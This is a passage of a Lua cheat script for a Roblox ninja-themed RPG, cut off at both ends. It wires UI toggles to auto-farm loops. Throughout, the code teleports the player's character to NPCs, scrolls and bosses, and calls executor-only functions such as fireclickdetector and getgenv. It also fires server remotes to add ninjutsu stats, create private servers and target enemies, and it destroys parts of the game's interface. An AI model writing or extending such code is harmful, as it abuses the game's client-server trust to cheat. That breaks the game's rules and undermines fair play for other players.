                return false
            end
            local JU = {
                ["[RPG] Forest of Embers"] = 5447073001,
                ["[RPG] Great Narumaki Bridge"] = 5451398863,
                ["[RPG] Training"] = 5431071837,
                ["[RPG] Village: Jejunes"] = 7923764447,
                ["[RPG] Shindai Valley"] = 5451401540,
                ["[RPG] Village: Dunes"] = 4601350394,
                ["[RPG] Village: Tempest"] = 6901575446,
                ["[RPG] Village: Storm"] = 5084678830,
                ["[RPG] Village: Obelisk "] = 4601350809,
                ["[RPG] Village: Ember"] = 4601350214,
                ["[RPG] Dawn Hideout"] = 5431069982,
                ["[RPG] Village: Nimbus"] = 4601350656,
                ["[RPG] Village: Ember 250 YC"] = 6986372023,
                ["[RPG] Village: Haze"] = 4601350760
            }
            task.spawn(
                function()
                    while true do
                        task.wait(1)
                        pcall(
                            function()
                                local IA = yU()
                                if IA[1] then
                                    zU:ChangeText("Scroll Name: " .. IA[#IA].Name)
                                    sU:ChangeText("Locations: " .. IA[#IA].Locations)
                                    MU:ChangeText("Spawned At: " .. IA[#IA].Value)
                                    if g.Auto_Collect_Scroll_Hop.Value then
                                        if IA[#IA] then
                                            if IA[#IA].Name ~= nil and IA[#IA].Locations ~= nil then
                                                if
                                                    game:GetService("MarketplaceService"):GetProductInfo(
                                                        game.PlaceId
                                                    ).Name == IA[#IA].Locations
                                                 then
                                                    warn(IA[#IA].Locations)
                                                    if pU() == false then
                                                        f.startevent:FireServer(
                                                            "createprivateserver",
                                                            tonumber(JU[IA[#IA].Locations])
                                                        )
                                                    else
                                                        f.Character.HumanoidRootPart.CFrame = pU().CFrame
                                                        if f:DistanceFromCharacter(pU().Position) <= 10 then
                                                            fireclickdetector(pU():FindFirstChild("ClickDetector"))
                                                        end
                                                    end
                                                else
                                                    warn(
                                                        tostring(IA[#IA].Locations),
                                                        tonumber(JU[IA[#IA].Locations])
                                                    )
                                                    f.startevent:FireServer(
                                                        "createprivateserver",
                                                        tonumber(JU[IA[#IA].Locations])
                                                    )
                                                end
                                            end
                                        end
                                    end
                                else
                                    zU:ChangeText("Scroll Name: N/A")
                                    sU:ChangeText("Locations: N/A")
                                    MU:ChangeText("Spawned At: N/A")
                                end
                            end
                        )
                    end
                end
            )
            local function bU()
                for CA, OA in pairs(workspace.npc:GetChildren()) do
                    if OA:FindFirstChild("Team") and tostring(OA:FindFirstChild("Team").Value) == tostring(f.Name) then
                        return true
                    end
                end
                return false
            end
            local function ZU()
                for uc, xc in pairs(f.statz.keys:GetChildren()) do
                    if game:GetService("ReplicatedStorage").alljutsu.companions:FindFirstChild(xc.Value) then
                        return xc
                    end
                end
                return false
            end
            task.spawn(
                function()
                    while true do
                        task.wait()
                        if g.Auto_Kaiton.Value then
                            pcall(
                                function()
                                    local wv = getgenv().GetScroll()
                                    f.CameraMaxZoomDistance = 30
                                    if g.Auto_Collect_Scroll.Value and wv ~= nil then
                                        f.Character.HumanoidRootPart.CFrame = wv.CFrame
                                        if
                                            f:DistanceFromCharacter(wv.Position) <= 30 and
                                                wv:FindFirstChild("ClickDetector")
                                         then
                                            fireclickdetector(wv:FindFirstChild("ClickDetector"))
                                            e:Notify(("Collecting Scroll :'%s'"):format(wv.Parent.Name), 10)
                                        end
                                    else
                                        if YU() == false then
                                            n = qU()
                                            if n ~= nil then
                                                if
                                                    n.HumanoidRootPart ~= nil and n.CLIENTTALK ~= nil and
                                                        n.Talk ~= nil
                                                 then
                                                    f.Character.HumanoidRootPart.CFrame =
                                                        n.HumanoidRootPart.CFrame * CFrame.new(0, 0, -3)
                                                    task.wait(0.2)
                                                    if f:DistanceFromCharacter(n.HumanoidRootPart.Position) <= 10 then
                                                        n.CLIENTTALK:FireServer()
                                                        n.CLIENTTALK:FireServer("accept")
                                                    end
                                                    task.wait(1)
                                                end
                                            else
                                                Teleport()
                                                task.wait(2)
                                            end
                                        else
                                            local S3 = ZU()
                                            if S3 ~= false and bU() == false then
                                                f.Character.combat.update:FireServer("key", "eend")
                                                f.Character.combat.update:FireServer("key", tostring(S3))
                                                f.Character.combat.update:FireServer("key", tostring(S3) .. "end")
                                            else
                                                local OW = hU()
                                                if OW ~= nil then
                                                    local gF = tick()
                                                    repeat
                                                        task.wait()
                                                        if OW == "Mission" then
                                                            local Yj = OU()
                                                            if Yj ~= nil then
                                                                if
                                                                    f:DistanceFromCharacter(Yj.CFrame.Position) <=
                                                                        100
                                                                 then
                                                                    local rL =
                                                                        f:FindFirstChild("currentmission").Value.text.Value
                                                                    if
                                                                        f:FindFirstChild("currentmission").intercept.Value
                                                                     then
                                                                        rL =
                                                                            f:FindFirstChild("currentmission").Value.enemytext.Value
                                                                    end
                                                                    local OL = rL
                                                                    local KL = OL:gsub("Defeat ", "")
                                                                    local mL = KL:gsub("%)", "")
                                                                    local wL = mL:gsub("%(", "")
                                                                    for mf, qf in pairs(workspace.npc:GetChildren()) do
                                                                        if
                                                                            qf:FindFirstChild("Humanoid") and
                                                                                qf:FindFirstChild("npctype")
                                                                         then
                                                                            if
                                                                                string.match(
                                                                                    tostring(wL),
                                                                                    tostring(
                                                                                        qf:FindFirstChild("npctype").Value
                                                                                    )
                                                                                ) and
                                                                                    f:DistanceFromCharacter(
                                                                                        qf.PrimaryPart.Position
                                                                                    ) <= 10000
                                                                             then
                                                                                if
                                                                                    game.ReplicatedStorage:FindFirstChild(
                                                                                        "alljutsu"
                                                                                    ) and
                                                                                        game.ReplicatedStorage:FindFirstChild(
                                                                                            "alljutsu"
                                                                                        ):WaitForChild(
                                                                                            "JINSPOWEEEERRRRRRRRRRRRRRRRRR"
                                                                                        ) and
                                                                                        f:FindFirstChild("statz") and
                                                                                        f:FindFirstChild("statz"):FindFirstChild(
                                                                                            "keys"
                                                                                        ) and
                                                                                        game.ReplicatedStorage.alljutsu.JINSPOWEEEERRRRRRRRRRRRRRRRRR:FindFirstChild(
                                                                                            f.statz.keys.z.Value
                                                                                        )
                                                                                 then
                                                                                    f.startevent:FireServer(
                                                                                        "addstat",
                                                                                        "ninjutsu",
                                                                                        100
                                                                                    )
                                                                                    if F() == false and E() == true then
                                                                                        if
                                                                                            f.Character ~= nil and
                                                                                                not f.Character:FindFirstChild(
                                                                                                    "zombify"
                                                                                                )
                                                                                         then
                                                                                            if
                                                                                                not f.Character:FindFirstChild(
                                                                                                    "bodyeffect"
                                                                                                )
                                                                                             then
                                                                                                f.Character.combat.update:FireServer(
                                                                                                    "key",
                                                                                                    "z"
                                                                                                )
                                                                                            end
                                                                                            workspace.VC.RemoteEvent:FireServer(
                                                                                                "!spirit"
                                                                                            )
                                                                                        else
                                                                                            workspace.Camera.CameraSubject =
                                                                                                f.Character
                                                                                        end
                                                                                    else
                                                                                        workspace.Camera.CameraSubject =
                                                                                            f.Character
                                                                                        f.Character.HumanoidRootPart.CFrame =
                                                                                            qf.PrimaryPart.CFrame *
                                                                                            CFrame.new(0, 10, 5)
                                                                                        workspace.CurrentCamera.CFrame =
                                                                                            CFrame.new(
                                                                                            workspace.CurrentCamera.CFrame.Position,
                                                                                            qf.PrimaryPart.Position
                                                                                        )
                                                                                        f.CameraMaxZoomDistance = 0
                                                                                        f.CameraMaxZoomDistance = 30
                                                                                        if
                                                                                            qf:FindFirstChild(
                                                                                                "HumanoidRootPart"
                                                                                            )
                                                                                         then
                                                                                            f.startevent:FireServer(
                                                                                                "target",
                                                                                                qf:FindFirstChild(
                                                                                                    "HumanoidRootPart"
                                                                                                )
                                                                                            )
                                                                                        end
                                                                                        f.Character.combat.update:FireServer(
                                                                                            "key",
                                                                                            "e"
                                                                                        )
                                                                                        f.Character.combat.update:FireServer(
                                                                                            "key",
                                                                                            "eend"
                                                                                        )
                                                                                    end
                                                                                    if
                                                                                        f.PlayerGui.Main.ingame.chat.Visible
                                                                                     then
                                                                                        f.PlayerGui.Main.ingame.chat.Visible =
                                                                                            false
                                                                                    else
                                                                                        if
                                                                                            f.Character:FindFirstChild(
                                                                                                "beserk"
                                                                                            )
                                                                                         then
                                                                                            f.Character:FindFirstChild(
                                                                                                "beserk"
                                                                                            ):Destroy()
                                                                                        else
                                                                                            if
                                                                                                f.PlayerGui:FindFirstChild(
                                                                                                    "Main"
                                                                                                ):FindFirstChild(
                                                                                                    "Frame"
                                                                                                )
                                                                                             then
                                                                                                f.PlayerGui:FindFirstChild(
                                                                                                    "Main"
                                                                                                ):FindFirstChild(
                                                                                                    "Frame"
                                                                                                ):Destroy()
                                                                                            end
                                                                                        end
                                                                                    end
                                                                                else
                                                                                    f.Character.HumanoidRootPart.CFrame =
                                                                                        qf.PrimaryPart.CFrame *
                                                                                        CFrame.new(0, 0, 5)
                                                                                    workspace.CurrentCamera.CFrame =
                                                                                        CFrame.new(
                                                                                        workspace.CurrentCamera.CFrame.Position,
                                                                                        qf.PrimaryPart.Position
                                                                                    )
                                                                                    if
                                                                                        f:DistanceFromCharacter(
                                                                                            qf.PrimaryPart.Position
                                                                                        ) <= 20
                                                                                     then
                                                                                        FU()
                                                                                    end
                                                                                end
                                                                            end
                                                                        end
                                                                    end
                                                                else
                                                                    f.Character.HumanoidRootPart.CFrame =
                                                                        Yj.CFrame * CFrame.new(0, 0, 0)
                                                                end
                                                            end
                                                        elseif OW == "Lost and Found" then
                                                            local gW = vU()
                                                            if gW ~= nil then
                                                                f.Character.HumanoidRootPart.CFrame = gW.CFrame
                                                            end
                                                        elseif OW == "Cleaning" then
                                                            local F1 = NU()
                                                            if F1 ~= nil then
                                                                f.Character.HumanoidRootPart.CFrame = F1.CFrame
                                                                task.wait(1)
                                                                fireclickdetector(F1.ClickDetector)
                                                            end
                                                        elseif OW == "Groceries" then
                                                            local Tt = OU()
                                                            if Tt ~= nil then
                                                                f.Character.HumanoidRootPart.CFrame = Tt.CFrame
                                                            end
                                                        elseif OW == "Delivery" then
                                                            local Dw = OU()
                                                            if Dw ~= nil then
                                                                f.Character.HumanoidRootPart.CFrame = Dw.CFrame
                                                            end
                                                        elseif OW == "Gardening" then
                                                            local mJ = DU()
                                                            if mJ ~= nil then
                                                                f.Character.HumanoidRootPart.CFrame = mJ.CFrame
                                                                fireclickdetector(mJ.ClickDetector)
                                                            end
                                                        end
                                                    until hU() == nil or not g.Auto_Kaiton.Value or YU() == false or
                                                        (hU() == "Mission" and tick() >= gF + 50) or
                                                        (g.Auto_Collect_Scroll.Value and
                                                            getgenv().GetScroll() ~= nil)
                                                    if YU() == true then
                                                        workspace.VC.RemoteEvent:FireServer("!cancel")
                                                    end
                                                end
                                            end
                                        end
                                    end
                                end
                            )
                        end
                    end
                end
            )
            task.spawn(
                function()
                    while true do
                        task.wait()
                        pcall(
                            function()
                                if g.Auto_Farm_Level.Value then
                                    local ZN = getgenv().GetScroll()
                                    f.CameraMaxZoomDistance = 30
                                    if g.Auto_Collect_Scroll.Value and ZN ~= nil then
                                        f.Character.HumanoidRootPart.CFrame = ZN.CFrame
                                        if
                                            f:DistanceFromCharacter(ZN.Position) <= 30 and
                                                ZN:FindFirstChild("ClickDetector")
                                         then
                                            fireclickdetector(ZN:FindFirstChild("ClickDetector"))
                                            e:Notify(("Collecting Scroll :'%s'"):format(ZN.Parent.Name), 10)
                                        end
                                    else
                                        if YU() == false then
                                            n = iU()
                                            if
                                                n ~= nil and n.HumanoidRootPart ~= nil and n.CLIENTTALK ~= nil and
                                                    n.Talk ~= nil
                                             then
                                                f.Character.HumanoidRootPart.CFrame =
                                                    n.HumanoidRootPart.CFrame * CFrame.new(0, 0, -3)
                                                task.wait(0.2)
                                                if f:DistanceFromCharacter(n.HumanoidRootPart.Position) <= 10 then
                                                    n.CLIENTTALK:FireServer()
                                                    n.CLIENTTALK:FireServer("accept")
                                                end
                                                task.wait(1)
                                            end
                                        else
                                            local QE = ZU()
                                            if QE ~= false and bU() == false then
                                                f.Character.combat.update:FireServer("key", "eend")
                                                f.Character.combat.update:FireServer("key", tostring(QE))
                                                f.Character.combat.update:FireServer("key", tostring(QE) .. "end")
                                            else
                                                local G6 = hU()
                                                if G6 ~= nil then
                                                    local ea = tick()
                                                    repeat
                                                        task.wait()
                                                        if G6 == "Mission" then
                                                            local WR = OU()
                                                            if WR ~= nil then
                                                                if
                                                                    f:DistanceFromCharacter(WR.CFrame.Position) <=
                                                                        100
                                                                 then
                                                                    local M0 =
                                                                        f:FindFirstChild("currentmission").Value.text.Value
                                                                    if
                                                                        f:FindFirstChild("currentmission").intercept.Value
                                                                     then
                                                                        M0 =
                                                                            f:FindFirstChild("currentmission").Value.enemytext.Value
                                                                    end
                                                                    local K0 = M0
                                                                    local c0 = K0:gsub("Defeat ", "")
                                                                    local Q0 = c0:gsub("%)", "")
                                                                    local b0 = Q0:gsub("%(", "")
                                                                    for QP, rP in pairs(workspace.npc:GetChildren()) do
                                                                        if
                                                                            rP:FindFirstChild("Humanoid") and
                                                                                rP:FindFirstChild("npctype")
                                                                         then
                                                                            if
                                                                                string.match(
                                                                                    tostring(b0),
                                                                                    tostring(
                                                                                        rP:FindFirstChild("npctype").Value
                                                                                    )
                                                                                ) and
                                                                                    f:DistanceFromCharacter(
                                                                                        rP.PrimaryPart.Position
                                                                                    ) <= 10000
                                                                             then
                                                                                if
                                                                                    game.ReplicatedStorage:FindFirstChild(
                                                                                        "alljutsu"
                                                                                    ) and
                                                                                        game.ReplicatedStorage:FindFirstChild(
                                                                                            "alljutsu"
                                                                                        ):WaitForChild(
                                                                                            "JINSPOWEEEERRRRRRRRRRRRRRRRRR"
                                                                                        ) and
                                                                                        f:FindFirstChild("statz") and
                                                                                        f:FindFirstChild("statz"):FindFirstChild(
                                                                                            "keys"
                                                                                        ) and
                                                                                        game.ReplicatedStorage.alljutsu.JINSPOWEEEERRRRRRRRRRRRRRRRRR:FindFirstChild(
                                                                                            f.statz.keys.z.Value
                                                                                        )
                                                                                 then
                                                                                    f.startevent:FireServer(
                                                                                        "addstat",
                                                                                        "ninjutsu",
                                                                                        100
                                                                                    )
                                                                                    if F() == false and E() == true then
                                                                                        if
                                                                                            f.Character ~= nil and
                                                                                                not f.Character:FindFirstChild(
                                                                                                    "zombify"
                                                                                                )
                                                                                         then
                                                                                            if
                                                                                                not f.Character:FindFirstChild(
                                                                                                    "bodyeffect"
                                                                                                )
                                                                                             then
                                                                                                f.Character.combat.update:FireServer(
                                                                                                    "key",
                                                                                                    "z"
                                                                                                )
                                                                                            end
                                                                                            workspace.VC.RemoteEvent:FireServer(
                                                                                                "!spirit"
                                                                                            )
                                                                                        else
                                                                                            workspace.Camera.CameraSubject =
                                                                                                f.Character
                                                                                        end
                                                                                    else
                                                                                        workspace.Camera.CameraSubject =
                                                                                            f.Character
                                                                                        f.Character.HumanoidRootPart.CFrame =
                                                                                            rP.PrimaryPart.CFrame *
                                                                                            CFrame.new(0, 10, 5)
                                                                                        workspace.CurrentCamera.CFrame =
                                                                                            CFrame.new(
                                                                                            workspace.CurrentCamera.CFrame.Position,
                                                                                            rP.PrimaryPart.Position
                                                                                        )
                                                                                        f.CameraMaxZoomDistance = 0
                                                                                        f.CameraMaxZoomDistance = 30
                                                                                        if
                                                                                            rP:FindFirstChild(
                                                                                                "HumanoidRootPart"
                                                                                            )
                                                                                         then
                                                                                            f.startevent:FireServer(
                                                                                                "target",
                                                                                                rP:FindFirstChild(
                                                                                                    "HumanoidRootPart"
                                                                                                )
                                                                                            )
                                                                                        end
                                                                                        f.Character.combat.update:FireServer(
                                                                                            "key",
                                                                                            "e"
                                                                                        )
                                                                                        f.Character.combat.update:FireServer(
                                                                                            "key",
                                                                                            "eend"
                                                                                        )
                                                                                    end
                                                                                    if
                                                                                        f.PlayerGui.Main.ingame.chat.Visible
                                                                                     then
                                                                                        f.PlayerGui.Main.ingame.chat.Visible =
                                                                                            false
                                                                                    else
                                                                                        if
                                                                                            f.Character:FindFirstChild(
                                                                                                "beserk"
                                                                                            )
                                                                                         then
                                                                                            f.Character:FindFirstChild(
                                                                                                "beserk"
                                                                                            ):Destroy()
                                                                                        else
                                                                                            if
                                                                                                f.PlayerGui:FindFirstChild(
                                                                                                    "Main"
                                                                                                ):FindFirstChild(
                                                                                                    "Frame"
                                                                                                )
                                                                                             then
                                                                                                f.PlayerGui:FindFirstChild(
                                                                                                    "Main"
                                                                                                ):FindFirstChild(
                                                                                                    "Frame"
                                                                                                ):Destroy()
                                                                                            end
                                                                                        end
                                                                                    end
                                                                                else
                                                                                    f.Character.HumanoidRootPart.CFrame =
                                                                                        rP.PrimaryPart.CFrame *
                                                                                        CFrame.new(0, 0, 5)
                                                                                    workspace.CurrentCamera.CFrame =
                                                                                        CFrame.new(
                                                                                        workspace.CurrentCamera.CFrame.Position,
                                                                                        rP.PrimaryPart.Position
                                                                                    )
                                                                                    if
                                                                                        f:DistanceFromCharacter(
                                                                                            rP.PrimaryPart.Position
                                                                                        ) <= 20
                                                                                     then
                                                                                        FU()
                                                                                    end
                                                                                end
                                                                            end
                                                                        end
                                                                    end
                                                                else
                                                                    f.Character.HumanoidRootPart.CFrame =
                                                                        WR.CFrame * CFrame.new(0, 0, 0)
                                                                end
                                                            end
                                                        elseif G6 == "Lost and Found" then
                                                            local YI = vU()
                                                            if YI ~= nil then
                                                                f.Character.HumanoidRootPart.CFrame = YI.CFrame
                                                            end
                                                        elseif G6 == "Cleaning" then
                                                            local F5 = NU()
                                                            if F5 ~= nil then
                                                                f.Character.HumanoidRootPart.CFrame = F5.CFrame
                                                                fireclickdetector(F5.ClickDetector)
                                                            end
                                                        elseif G6 == "Groceries" then
                                                            local xQ = OU()
                                                            if xQ ~= nil then
                                                                f.Character.HumanoidRootPart.CFrame = xQ.CFrame
                                                            end
                                                        elseif G6 == "Delivery" then
                                                            local mZ = OU()
                                                            if mZ ~= nil then
                                                                f.Character.HumanoidRootPart.CFrame = mZ.CFrame
                                                            end
                                                        elseif G6 == "Gardening" then
                                                            local m6 = DU()
                                                            if m6 ~= nil then
                                                                f.Character.HumanoidRootPart.CFrame = m6.CFrame
                                                                fireclickdetector(m6.ClickDetector)
                                                            end
                                                        end
                                                    until hU() == nil or not g.Auto_Farm_Level.Value or
                                                        YU() == false or
                                                        (hU() == "Mission" and tick() >= ea + 50) or
                                                        (g.Auto_Collect_Scroll.Value and
                                                            getgenv().GetScroll() ~= nil)
                                                    if YU() == true then
                                                        workspace.VC.RemoteEvent:FireServer("!cancel")
                                                    end
                                                end
                                            end
                                        end
                                    end
                                end
                            end
                        )
                    end
                end
            )
            local function XU()
                if workspace:FindFirstChild("npc") then
                    for rU, mU in pairs(workspace.npc:GetChildren()) do
                        if mU:FindFirstChild("npctype") and mU:FindFirstChild("megaboss") then
                            return mU
                        end
                    end
                end
                return false
            end
            local function GU()
                if
                    workspace:FindFirstChild("tailbeastbossmission") and
                        workspace.tailbeastbossmission.missions:FindFirstChildOfClass("Folder")
                 then
                    for P4, H4 in pairs(
                        workspace.tailbeastbossmission.missions:FindFirstChildOfClass("Folder"):GetChildren()
                    ) do
                        if
                            H4:FindFirstChild("Talk") and H4:FindFirstChild("HumanoidRootPart") and
                                H4:FindFirstChild("Talk"):FindFirstChild("accepted") and
                                H4:FindFirstChild("Talk"):FindFirstChild("accepted").Value == false
                         then
                            return H4
                        end
                    end
                end
                return false
            end
            task.spawn(
                function()
                    while true do
                        task.wait()
                        if g.Auto_Train_Logs.Value then
                            for BR, zR in pairs(workspace.npc:GetChildren()) do
                                if zR.Name == "logtraining" then
                                    repeat
                                        task.wait()
                                        if
                                            game.ReplicatedStorage:FindFirstChild("alljutsu") and
                                                game.ReplicatedStorage:FindFirstChild("alljutsu"):WaitForChild(
                                                    "JINSPOWEEEERRRRRRRRRRRRRRRRRR"
                                                ) and
                                                f:FindFirstChild("statz") and
                                                f:FindFirstChild("statz"):FindFirstChild("keys") and
                                                game.ReplicatedStorage.alljutsu.JINSPOWEEEERRRRRRRRRRRRRRRRRR:FindFirstChild(
                                                    f.statz.keys.z.Value
                                                )
                                         then
                                            f.startevent:FireServer("addstat", "ninjutsu", 100)
                                            if F() == false and E() == true then
                                                if f.Character ~= nil and not f.Character:FindFirstChild("zombify") then
                                                    if not f.Character:FindFirstChild("bodyeffect") then
                                                        f.Character.combat.update:FireServer("key", "z")
                                                    end
                                                    workspace.VC.RemoteEvent:FireServer("!spirit")
                                                else
                                                    workspace.Camera.CameraSubject = f.Character
                                                end
                                            else
                                                workspace.Camera.CameraSubject = f.Character
                                                f.CameraMaxZoomDistance = 0
                                                f.CameraMaxZoomDistance = 30
                                                f.Character.HumanoidRootPart.CFrame =
                                                    zR.PrimaryPart.CFrame * CFrame.new(0, -2, 10)
                                                workspace.CurrentCamera.CFrame =
                                                    CFrame.new(
                                                    workspace.CurrentCamera.CFrame.Position,
                                                    zR.PrimaryPart.Position
                                                )
                                                if zR:FindFirstChild("HumanoidRootPart") then
                                                    f.startevent:FireServer(
                                                        "target",
                                                        zR:FindFirstChild("HumanoidRootPart")
                                                    )
                                                end
                                                f.Character.combat.update:FireServer("key", "e")
                                                f.Character.combat.update:FireServer("key", "eend")
                                            end
                                            if f.PlayerGui.Main.ingame.chat.Visible then
                                                f.PlayerGui.Main.ingame.chat.Visible = false
                                            else
                                                if f.Character:FindFirstChild("beserk") then
                                                    f.Character:FindFirstChild("beserk"):Destroy()
                                                else
                                                    if f.PlayerGui:FindFirstChild("Main"):FindFirstChild("Frame") then
                                                        f.PlayerGui:FindFirstChild("Main"):FindFirstChild("Frame"):Destroy(

                                                        )
                                                    end
                                                end
                                            end
                                        else
                                            f.Character.HumanoidRootPart.CFrame =
                                                zR.PrimaryPart.CFrame * CFrame.new(0, 30, 5)
                                            jU()
                                        end
                                    until not zR or not zR:FindFirstChild("Head") or not g.Auto_Train_Logs.Value
                                    f.CameraMaxZoomDistance = 30
                                end
                            end
                        end
                    end
                end
            )
            task.spawn(
                function()
                    while true do
                        task.wait()
                        if g.Auto_Farm_Spirit.Value then
                            pcall(
                                function()
                                    local RD = getgenv().GetScroll()
                                    w:ChangeText("Status : N/A")
                                    f.CameraMaxZoomDistance = 30
                                    if g.Auto_Collect_Scroll.Value and RD ~= nil then
                                        f.Character.HumanoidRootPart.CFrame = RD.CFrame
                                        if
                                            f:DistanceFromCharacter(RD.Position) <= 30 and
                                                RD:FindFirstChild("ClickDetector")
                                         then
                                            fireclickdetector(RD:FindFirstChild("ClickDetector"))
                                            e:Notify(("Collecting Scroll :'%s'"):format(RD.Parent.Name), 10)
                                        end
                                    else
                                        if XU() == false then
                                            local lj = GU()
                                            if lj ~= false then
                                                if
                                                    lj.HumanoidRootPart ~= nil and lj.CLIENTTALK ~= nil and
                                                        lj.Talk ~= nil
                                                 then
                                                    f.Character.HumanoidRootPart.CFrame =
                                                        lj.HumanoidRootPart.CFrame * CFrame.new(0, 0, -3)
                                                    task.wait(0.2)
                                                    if f:DistanceFromCharacter(lj.HumanoidRootPart.Position) <= 10 then
                                                        lj.CLIENTTALK:FireServer()
                                                        lj.CLIENTTALK:FireServer("accept")
                                                    end
                                                    task.wait(1)
                                                end
                                            else
                                                if g.Auto_Farm_Spirit_Hop.Value then
                                                    Teleport()
                                                    task.wait(2)
                                                end
                                            end
                                        else
                                            repeat
                                                task.wait()
                                                w:ChangeText(
                                                    "Killing " ..
                                                        tostring((XU():FindFirstChild("npctype").Value):sub(1, -2)) ..
                                                            " | " ..
                                                                XU().Humanoid.Health ..
                                                                    "/" .. XU().Humanoid.MaxHealth
                                                )
                                                if
                                                    game.ReplicatedStorage:FindFirstChild("alljutsu") and
                                                        game.ReplicatedStorage:FindFirstChild("alljutsu"):WaitForChild(
                                                            "JINSPOWEEEERRRRRRRRRRRRRRRRRR"
                                                        ) and
                                                        f:FindFirstChild("statz") and
                                                        f:FindFirstChild("statz"):FindFirstChild("keys") and
                                                        game.ReplicatedStorage.alljutsu.JINSPOWEEEERRRRRRRRRRRRRRRRRR:FindFirstChild(
                                                            f.statz.keys.z.Value
                                                        )
                                                 then
                                                    f.startevent:FireServer("addstat", "ninjutsu", 100)
                                                    if F() == false and E() == true then
                                                        if
                                                            f.Character ~= nil and
                                                                not f.Character:FindFirstChild("zombify")
                                                         then
                                                            if not f.Character:FindFirstChild("bodyeffect") then
                                                                f.Character.combat.update:FireServer("key", "z")
                                                            end
                                                            workspace.VC.RemoteEvent:FireServer("!spirit")
                                                        else
                                                            workspace.Camera.CameraSubject = f.Character
                                                        end
                                                    else
                                                        workspace.Camera.CameraSubject = f.Character
                                                        f.CameraMaxZoomDistance = 0
                                                        f.CameraMaxZoomDistance = 30
                                                        f.Character.HumanoidRootPart.CFrame =
                                                            XU().HumanoidRootPart.CFrame * CFrame.new(0, 30, 0)
                                                        workspace.CurrentCamera.CFrame =
                                                            CFrame.new(
                                                            workspace.CurrentCamera.CFrame.Position,
                                                            XU().HumanoidRootPart.Position
                                                        )
                                                        if XU():FindFirstChild("HumanoidRootPart") then
                                                            f.startevent:FireServer(
                                                                "target",
                                                                XU():FindFirstChild("HumanoidRootPart")
                                                            )
                                                        end
                                                        f.Character.combat.update:FireServer("key", "e")
                                                        f.Character.combat.update:FireServer("key", "eend")
                                                    end
                                                    if f.PlayerGui.Main.ingame.chat.Visible then
                                                        f.PlayerGui.Main.ingame.chat.Visible = false
                                                    else
                                                        if f.Character:FindFirstChild("beserk") then
                                                            f.Character:FindFirstChild("beserk"):Destroy()
                                                        else
                                                            if
                                                                f.PlayerGui:FindFirstChild("Main"):FindFirstChild(
                                                                    "Frame"
                                                                )
                                                             then
                                                                f.PlayerGui:FindFirstChild("Main"):FindFirstChild(
                                                                    "Frame"
                                                                ):Destroy()
                                                            end
                                                        end
                                                    end
                                                else
                                                    f.Character.HumanoidRootPart.CFrame =
                                                        XU().HumanoidRootPart.CFrame
                                                    jU()
                                                end
                                            until XU() == false or not g.Auto_Farm_Spirit.Value or
                                                (g.Auto_Collect_Scroll.Value and getgenv().GetScroll() ~= nil)
                                        end
                                    end
                                end
                            )
                        end
                    end
                end
            )
            task.spawn(
                function()
                    while true do
                        task.wait()
                        if
                            g.Auto_Collect_Scroll.Value and not g.Auto_Farm_Level.Value and not g.Auto_Kaiton.Value and
                                not g.Auto_Farm_Spirit.Value
                         then
                            local XL = getgenv().GetScroll()
                            if g.Auto_Collect_Scroll.Value and XL ~= nil then
                                f.Character.HumanoidRootPart.CFrame = XL.CFrame
                                if f:DistanceFromCharacter(XL.Position) <= 30 and XL:FindFirstChild("ClickDetector") then
                                    fireclickdetector(XL:FindFirstChild("ClickDetector"))
                                    e:Notify(("Collecting Scroll :'%s'"):format(XL.Parent.Name), 10)
                                end
                            end
                        end
                    end
                end
            )
            task.spawn(
                function()
                    while true do
                        task.wait()
                        tU()
                    end
                end
            )
        end
        if workspace:FindFirstChild("eventbossmission") then
            task.wait(2)
            local n = t:AddTab("Boss Event")
            local j = n:AddLeftGroupbox("Event - Farm")
            j:AddLabel("Auto Farm Bosses - Status", true)
            local P = j:AddLabel("Status : N/A", false)
            j:AddLabel("Spirit - Farm", true)
            j:AddToggle("Auto_Farm_Bosses_Event", {Text = "Auto Farm Bosses"})
            j:AddToggle("Auto_Farm_Bosses_Event_Hop", {Text = "Auto Farm Bosses Hop"})
            local function s()
                if workspace:FindFirstChild("npc") then
                    for A, w in pairs(workspace.npc:GetChildren()) do
                        if
                            w:FindFirstChild("npctype") and w:FindFirstChild("megaboss") and
                                game:GetService("ReplicatedStorage").bosses:FindFirstChild(
                                    w:FindFirstChild("npctype").Value
                                ) and
                                w:FindFirstChild("Humanoid") and
                                w:FindFirstChild("Humanoid").Health ~= 0
                         then
                            return w
                        end
                    end
                end
                return false
            end
            local function W()
                if
                    workspace:FindFirstChild("eventbossmission") and
                        workspace.eventbossmission.missions:FindFirstChildOfClass("Folder")
                 then
                    for q, w in pairs(
                        workspace.eventbossmission.missions:FindFirstChildOfClass("Folder"):GetChildren()
                    ) do
                        if
                            w:FindFirstChild("Talk") and w:FindFirstChild("HumanoidRootPart") and
                                w:FindFirstChild("Talk"):FindFirstChild("accepted") and
                                w:FindFirstChild("Talk"):FindFirstChild("accepted").Value == false
                         then
                            return w
                        end
                    end
                end
                return false
            end
            task.spawn(
                function()
                    while true do
                        task.wait()
                        if g.Auto_Farm_Bosses_Event.Value then
                            pcall(
                                function()
                                    local w = getgenv().GetScroll()
                                    P:ChangeText("Status : N/A")
                                    f.CameraMaxZoomDistance = 30
                                    if g.Auto_Collect_Scroll.Value and w ~= nil then
                                        f.Character.HumanoidRootPart.CFrame = w.CFrame
                                        if
                                            f:DistanceFromCharacter(w.Position) <= 30 and
                                                w:FindFirstChild("ClickDetector")
                                         then
                                            fireclickdetector(w:FindFirstChild("ClickDetector"))
                                            e:Notify(("Collecting Scroll :'%s'"):format(w.Parent.Name), 10)
                                        end
                                    else
                                        if s() == false then
                                            local Q = W()
                                            if Q ~= false then
                                                if
                                                    Q.HumanoidRootPart ~= nil and Q.CLIENTTALK ~= nil and
                                                        Q.Talk ~= nil
                                                 then
                                                    f.Character.HumanoidRootPart.CFrame =
                                                        Q.HumanoidRootPart.CFrame * CFrame.new(0, 0, -3)
                                                    task.wait(0.2)
                                                    if f:DistanceFromCharacter(Q.HumanoidRootPart.Position) <= 10 then
                                                        Q.CLIENTTALK:FireServer()
                                                        Q.CLIENTTALK:FireServer("accept")
                                                    end
                                                    task.wait(1)
                                                end
                                            else
                                                if g.Auto_Farm_Bosses_Event_Hop.Value then
                                                    Teleport()
                                                    task.wait(2)
                                                end
                                            end
                                        else
                                            repeat
                                                task.wait()
                                                P:ChangeText(
                                                    "Killing " ..
                                                        tostring((s():FindFirstChild("npctype").Value):sub(1, -2)) ..
                                                            " | " ..
                                                                s().Humanoid.Health .. "/" .. s().Humanoid.MaxHealth
                                                )
                                                if
                                                    game.ReplicatedStorage:FindFirstChild("alljutsu") and
